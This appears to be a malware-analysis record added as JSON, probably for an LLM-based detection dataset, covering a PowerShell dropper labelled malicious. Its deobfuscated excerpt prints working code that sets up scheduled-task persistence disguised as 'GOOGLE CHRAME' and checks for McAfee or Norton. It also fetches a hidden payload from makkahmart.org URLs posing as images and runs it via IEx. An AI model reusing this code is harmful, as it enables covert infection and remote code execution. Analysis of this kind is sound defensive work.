@@ -1,0 +1,138 @@
+{
+  "meta": {
+    "quelldatei": "054ca3d10e6696769835c8db9ba3bd09142237d21b5bddb013598053f6e0230a.ps1",
+    "sha256": "054ca3d10e6696769835c8db9ba3bd09142237d21b5bddb013598053f6e0230a",
+    "groesse_bytes": 2097,
+    "zeilen": 58,
+    "ground_truth_label": "malicious",
+    "analyse_gekuerzt": false,
+    "hinweis": "Kein Urteil enthalten. Bewertung erfolgt durch das LLM."
+  },
+  "stufe1_extract": {
+    "strings": [
+      "C:\\ProgramData\\Document\\",
+      "\r\non error resume next\r\nOn Error Resume Next\r\nDim syncCmd\r\nsyncCmd = \"$BLNLS=",
+      ";$T=",
+      ";IEx([<#1#>IO.File<#1#>]::$BLNLS($T))\"\r\nDim psCmd\r\npsCmd = \"powershell.exe -NonInteractive -WindowStyle Hidden -ExecutionPolicy RemoteSigned -Command &{\" & syncCmd & \"}\"\r\nDim WINDOSTE\r\nSet WINDOSTE = WScript.CreateObject(\"WScript.Shell\")\r\nWINDOSTE.Run psCmd, 0\r\n\r\n",
+      "C:\\ProgramData\\Document\\servicing.vbs",
+      "GOOGLE CHRAME",
+      "C/:/\\P/r/o/g/ra/m/D/at/a\\D/oc/um/ent\\",
+      ")\r\n$mcAfee = 'C:/\\Pr/o/g/ra/m Fi/les/\\Co/mm/o/n F/i/le/s\\/M/c/A/f/e/e\\P/l/a/t/f/o/r/m\\/M/cU/IC/nt/.e/x/e'.Replace(",
+      ")\r\n$nort = 'C:/\\Pr/og/ra/m Fil/es\\No/r/to/n S/ecu/rit/y\\i/so/l/at/e./i/n/i'.Replace(",
+      ")\r\n\r\nif([System.IO.File]::Exists($mcAfee)){\r\n\r\nif((New-Object ",
+      "`D`o`w`N`l`o`A`d`F`i`l`e",
+      "https://makkahmart.org/.POP/.M1.jpg",
+      "Documents.ps1",
+      "`N`e`T`.`W`e`B`C`l`i`e`N`T",
+      "https://makkahmart.org/.POP/.N1.jpg",
+      "https://makkahmart.org/.POP/.D1.jpg"
+    ],
+    "string_anzahl_gesamt": 25,
+    "base64_bloecke_dekodiert": [],
+    "base64_bloecke_gesamt": 0
+  },
+  "stufe2_features": {
+    "strings": [
+      "C:\\ProgramData\\Document\\",
+      "\r\non error resume next\r\nOn Error Resume Next\r\nDim syncCmd\r\nsyncCmd = \"$BLNLS=",
+      ";$T=",
+      ";IEx([<#1#>IO.File<#1#>]::$BLNLS($T))\"\r\nDim psCmd\r\npsCmd = \"powershell.exe -NonInteractive -WindowStyle Hidden -ExecutionPolicy RemoteSigned -Command &{\" & syncCmd & \"}\"\r\nDim WINDOSTE\r\nSet WINDOSTE = WScript.CreateObject(\"WScript.Shell\")\r\nWINDOSTE.Run psCmd, 0\r\n\r\n",
+      "C:\\ProgramData\\Document\\servicing.vbs",
+      "GOOGLE CHRAME",
+      "C/:/\\P/r/o/g/ra/m/D/at/a\\D/oc/um/ent\\",
+      ")\r\n$mcAfee = 'C:/\\Pr/o/g/ra/m Fi/les/\\Co/mm/o/n F/i/le/s\\/M/c/A/f/e/e\\P/l/a/t/f/o/r/m\\/M/cU/IC/nt/.e/x/e'.Replace(",
+      ")\r\n$nort = 'C:/\\Pr/og/ra/m Fil/es\\No/r/to/n S/ecu/rit/y\\i/so/l/at/e./i/n/i'.Replace(",
+      ")\r\n\r\nif([System.IO.File]::Exists($mcAfee)){\r\n\r\nif((New-Object ",
+      "`D`o`w`N`l`o`A`d`F`i`l`e",
+      "https://makkahmart.org/.POP/.M1.jpg",
+      "Documents.ps1",
+      "`N`e`T`.`W`e`B`C`l`i`e`N`T",
+      "https://makkahmart.org/.POP/.N1.jpg",
+      "https://makkahmart.org/.POP/.D1.jpg"
+    ],
+    "string_anzahl_gesamt": 25,
+    "base64_bloecke_dekodiert": [],
+    "base64_bloecke_gesamt": 0,
+    "beobachtete_cmdlets": [
+      "Get-Date",
+      "New-Object",
+      "New-ScheduledTaskAction",
+      "New-ScheduledTaskTrigger",
+      "New-TimeSpan",
+      "Register-ScheduledTask"
+    ],
+    "auffaellige_tokens": {
+      "invoke_expression": 1,
+      "window_hidden": 1,
+      "scheduled_task": 1
+    },
+    "iocs": {
+      "urls": [
+        "https://makkahmart.org/.POP/.D1.jpg",
+        "https://makkahmart.org/.POP/.M1.jpg",
+        "https://makkahmart.org/.POP/.N1.jpg"
+      ],
+      "ipv4": [],
+      "pfade": [
+        "C:\\ProgramData\\Document\\",
+        "C:\\ProgramData\\Document\\Documents.ps1",
+        "C:\\ProgramData\\Document\\servicing.vbs"
+      ]
+    }
+  },
+  "stufe3_structure": {
+    "strings": [
+      "C:\\ProgramData\\Document\\",
+      "\r\non error resume next\r\nOn Error Resume Next\r\nDim syncCmd\r\nsyncCmd = \"$BLNLS=",
+      ";$T=",
+      ";IEx([<#1#>IO.File<#1#>]::$BLNLS($T))\"\r\nDim psCmd\r\npsCmd = \"powershell.exe -NonInteractive -WindowStyle Hidden -ExecutionPolicy RemoteSigned -Command &{\" & syncCmd & \"}\"\r\nDim WINDOSTE\r\nSet WINDOSTE = WScript.CreateObject(\"WScript.Shell\")\r\nWINDOSTE.Run psCmd, 0\r\n\r\n",
+      "C:\\ProgramData\\Document\\servicing.vbs",
+      "GOOGLE CHRAME",
+      "C/:/\\P/r/o/g/ra/m/D/at/a\\D/oc/um/ent\\",
+      ")\r\n$mcAfee = 'C:/\\Pr/o/g/ra/m Fi/les/\\Co/mm/o/n F/i/le/s\\/M/c/A/f/e/e\\P/l/a/t/f/o/r/m\\/M/cU/IC/nt/.e/x/e'.Replace(",
+      ")\r\n$nort = 'C:/\\Pr/og/ra/m Fil/es\\No/r/to/n S/ecu/rit/y\\i/so/l/at/e./i/n/i'.Replace(",
+      ")\r\n\r\nif([System.IO.File]::Exists($mcAfee)){\r\n\r\nif((New-Object ",
+      "`D`o`w`N`l`o`A`d`F`i`l`e",
+      "https://makkahmart.org/.POP/.M1.jpg",
+      "Documents.ps1",
+      "`N`e`T`.`W`e`B`C`l`i`e`N`T",
+      "https://makkahmart.org/.POP/.N1.jpg",
+      "https://makkahmart.org/.POP/.D1.jpg"
+    ],
+    "string_anzahl_gesamt": 25,
+    "base64_bloecke_dekodiert": [],
+    "base64_bloecke_gesamt": 0,
+    "beobachtete_cmdlets": [
+      "Get-Date",
+      "New-Object",
+      "New-ScheduledTaskAction",
+      "New-ScheduledTaskTrigger",
+      "New-TimeSpan",
+      "Register-ScheduledTask"
+    ],
+    "auffaellige_tokens": {
+      "invoke_expression": 1,
+      "window_hidden": 1,
+      "scheduled_task": 1
+    },
+    "iocs": {
+      "urls": [
+        "https://makkahmart.org/.POP/.D1.jpg",
+        "https://makkahmart.org/.POP/.M1.jpg",
+        "https://makkahmart.org/.POP/.N1.jpg"
+      ],
+      "ipv4": [],
+      "pfade": [
+        "C:\\ProgramData\\Document\\",
+        "C:\\ProgramData\\Document\\Documents.ps1",
+        "C:\\ProgramData\\Document\\servicing.vbs"
+      ]
+    },
+    "deobfuskiert_auszug": "Function Georgina\r\n{\r\n\r\nstart-sleep -s 2\r\n[system.io.directory]::CreateDirectory(\"C:\\ProgramData\\Document\\\")\r\n#-----------------------------------------------------------------------------\r\n$Content = @'\r\non error resume next\r\nOn Error Resume Next\r\nDim syncCmd\r\nsyncCmd = \"$BLNLS='ReadAllText';$T='C:\\ProgramData\\Document\\Documents.ps1';IEx([<#1#>IO.File<#1#>]::$BLNLS($T))\"\r\nDim psCmd\r\npsCmd = \"powershell.exe -NonInteractive -WindowStyle Hidden -ExecutionPolicy RemoteSigned -Command &{\" & syncCmd & \"}\"\r\nDim WINDOSTE\r\nSet WINDOSTE = WScript.CreateObject(\"WScript.Shell\")\r\nWINDOSTE.Run psCmd, 0\r\n\r\n'@\r\n[IO.File]::WriteAllText(\"C:\\ProgramData\\Document\\servicing.vbs\", $Content)\r\n#-----------------------------------------------------------------------------\r\n\r\nstart-sleep -s 3\r\n\r\n$action = New-ScheduledTaskAction -Execute 'C:\\ProgramData\\Document\\servicing.vbs'\r\n$trigger = New-ScheduledTaskTrigger -Once -At (Get-Date) -RepetitionInterval (New-TimeSpan -Minutes 2)\r\nRegister-ScheduledTask -Action $action -Trigger $trigger -TaskName \"GOOGLE CHRAME\"\r\n\r\nstart-sleep -s 6\r\n\r\n$NEWS = 'C/:/\\P/r/o/g/ra/m/D/at/a\\D/oc/um/ent\\'.Replace(\"/\",\"\")\r\n$mcAfee = 'C:/\\Pr/o/g/ra/m Fi/les/\\Co/mm/o/n F/i/le/s\\/M/c/A/f/e/e\\P/l/a/t/f/o/r/m\\/M/cU/IC/nt/.e/x/e'.Replace(\"/\",\"\")\r\n$nort = 'C:/\\Pr/og/ra/m Fil/es\\No/r/to/n S/ecu/rit/y\\i/so/l/at/e./i/n/i'.Replace(\"/\",\"\")\r\n\r\nif([System.IO.File]::Exists($mcAfee)){\r\n\r\nif((New-Object \"NeT.WeBClieNT\").\"DowNloAdFile\"('https://makkahmart.org/.POP/.M1.jpg', $NEWS + 'Documents.ps1')){\r\n}\r\nstart-sleep -s 7\r\nStart \"C:\\ProgramData\\Document\\servicing.vbs\"\r\n}\r\nelseif([System.IO.File]::Exists($nort)){\r\n\r\nif((New-Object \"NeT.WeBClieNT\").\"DowNloAdFile\"('https://makkahmart.org/.POP/.N1.jpg', $NEWS + 'Documents.ps1')){\r\n}\r\nstart-sleep -s 7\r\nStart \"C:\\ProgramData\\Document\\servicing.vbs\"\r\n}\r\nelse{\r\n\r\nif((New-Object \"NeT.WeBClieNT\").\"DowNloAdFile\"('https://makkahmart.org/.POP/.D1.jpg', $NEWS + 'Documents.ps1')){\r\n}\r\n\r\nstart-sleep -s 7\r\nStart \"C:\\ProgramData\\Document\\servicing.vbs\"",
+    "dekodierte_befehle": [],
+    "beobachtete_abfolge": [
+      "geplante Aufgabe anlegen",
+      "Zeichenkette als Code ausfuehren"
+    ]
+  }
+}
